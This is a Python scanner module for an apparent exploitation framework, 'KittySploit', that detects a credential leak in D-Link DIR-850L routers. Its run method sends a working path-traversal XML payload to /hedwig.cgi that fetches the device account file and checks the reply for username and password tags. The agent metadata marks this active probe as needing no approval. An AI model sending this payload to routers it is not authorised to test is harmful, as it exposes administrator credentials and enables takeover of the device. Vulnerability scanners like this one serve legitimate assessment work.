#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects Dlink Dir-850L Info Leak."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dlink Dir-850L Info Leak Detection',
        'description': 'Detects Dlink Dir-850L Info Leak.',
        'author': ['KittySploit Team'],
        'severity': 'info',
        'tags': ['web', 'scanner', 'vulnerability', 'dlink', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://xz.aliyun.com/t/2941'],
    }

    def run(self):
        path = '/hedwig.cgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Cookie': 'uid=R8tBjwtFc8', 'Content-Type': 'text/xml'}, data='<?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('</usrid>', '</password>',)
        if any(m in body for m in body_any):
            self.set_info(
                severity='info',
                reason='Dlink Dir-850L Info Leak detected',
                path=path,
            )
            return True
        return False

